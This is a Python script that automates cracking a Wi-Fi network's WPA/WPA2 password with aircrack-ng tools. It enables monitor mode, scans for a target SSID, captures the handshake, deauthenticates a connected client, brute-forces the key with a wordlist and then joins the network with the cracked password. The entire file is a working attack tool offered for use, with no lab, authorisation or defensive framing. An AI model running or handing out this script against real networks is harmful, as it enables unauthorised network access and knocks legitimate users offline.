import subprocess
import sys
import time
import re
import os

def start_monitor_mode(interface):
    subprocess.run(["sudo", "airmon-ng", "start", interface], check=True)
    return f"{interface}"

def scan_for_networks(monitor_interface):
    # subprocess.Popen(["xterm", "-e", f"sudo airodump-ng {monitor_interface}"])
    # print("Scanning for networks...")
    # subprocess.Popen(["sudo", "airodump-ng", monitor_interface, ">", "scan_results.txt"], shell=True)
    # subprocess.Popen(["xterm", "-e", f"sudo airodump-ng {monitor_interface} > scan_results.txt"], stdout=open("scan_results.txt", 'w'), shell=True)
    
    output_file="scan_results.txt"
    input("Press Enter when ready to scan for networks...")
    subprocess.run(["sudo", "airodump-ng", monitor_interface], stdout=open(output_file, 'w'))
    print("Scanning for networks complete.")

def capture_handshake(monitor_interface, channel, bssid, output_file):
    subprocess.Popen(["xterm", "-e", f"sudo airodump-ng -c {channel} --bssid {bssid} -w {output_file} {monitor_interface}"])
    print("Capturing 4-way handshake...")

def deauthenticate_target(monitor_interface, bssid, client_mac):
    subprocess.Popen(["xterm", "-e", f"sudo aireplay-ng -0 1 -a {bssid} -c {client_mac} --ignore-negative-one {monitor_interface}"])
    print("Deauthentication packets sent successfully.")

def crack_password(bssid, cap_file, wordlist):
    # Find the file matching the pattern
    output_file = "password.txt"
    cap_file_pattern = f"{cap_file}-01.cap"
    cap_files = subprocess.check_output(["ls"]).decode().split("\n")
    cap_file_to_crack = None
    for cap_file in cap_files:
        if re.match(cap_file_pattern, cap_file):
            cap_file_to_crack = cap_file
            break
    if cap_file_to_crack:
        command = f"sudo aircrack-ng -a2 -b {bssid} -w {wordlist} {cap_file_to_crack} > {output_file} | grep 'KEY FOUND'"
        subprocess.run(command, shell=True)
        print(f"Cracked password saved to {output_file}")
        command = f"cat password.txt | grep 'KEY FOUND'"
        subprocess.run(command, shell=True)
        
    else:
        print("No matching capture file found for cracking.")
        
def get_bssid_and_channel(monitor_interface, ssid):
    with open("scan_results.txt", "r") as scan_results_file:
        lines = scan_results_file.read().strip().split('\n')
        list_of_lists = [line.split() for line in lines]
        bssid = None
        channel = None
        for lst in list_of_lists:
            if ssid in lst:
                bssid = lst[1]
                channel = lst[6]
                break
    print("BSSID:", bssid )
    print("Channel:", channel)
    return bssid, channel

def get_client_mac(monitor_interface, bssid):
    output = subprocess.check_output(["sudo", "aireplay-ng", "-0", "2", "-a", bssid, "--ignore-negative-one", monitor_interface]).decode()
    client_mac = output.split("\n")[-2].split()[0]
    return client_mac

def get_unique_words_from_file(filename):
    # Run the command and capture its output
    completed_process = subprocess.run(
        ["grep", "-oP", "KEY FOUND! \[\s*\K[^]]+", filename],
        stdout=subprocess.PIPE,
        text=True
    )

    # Check if the command was successful
    if completed_process.returncode == 0:
        # Extract and trim unique words from the output
        output_lines = completed_process.stdout.strip().split('\n')
        unique_words = sorted(set(output_lines))
        return unique_words
    else:
        print("Error occurred while running the command.")
        return None


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python script.py <monitor_interface> <ssid>")
        sys.exit(1)

    monitor_interface = sys.argv[1]
    ssid = sys.argv[2]

    # Step 1: Start monitor mode
    monitor_interface = start_monitor_mode(monitor_interface)
    print("Monitor mode started successfully.")

    # Step 2: Scan for networks
    scan_for_networks(monitor_interface)
    # time.sleep(20)

    # Step 3: Extract BSSID and channel for the target network
    bssid, channel = get_bssid_and_channel(monitor_interface, ssid)
    if not bssid or not channel:
        print("Target network not found.")
        sys.exit(1)
    print(f"Target Network BSSID: {bssid}")
    print(f"Target Network Channel: {channel}")

    # Step 4: Capture 4-way handshake
    output_file = f"{ssid}-handshake.cap"
    capture_handshake(monitor_interface, channel, bssid, output_file)

    # Step 5: Deauthenticate the target
    time.sleep(10)  # Wait for handshake capture to start
    client_mac = get_client_mac(monitor_interface, bssid)
    print(f"Client MAC Address: {client_mac}")
    deauthenticate_target(monitor_interface, bssid, client_mac)
    time.sleep(20)

    # Step 6: Crack the password
    wordlist = "wordlist.txt"
    crack_password(bssid, output_file, wordlist)
    
    filename = "password.txt"
    password = get_unique_words_from_file(filename)
    if password is not None:
    	for word in password:
        	print(word)
        	print(f"bash connect.sh {ssid} {word}")
        	os.system(f"bash connect.sh {ssid} {word}")

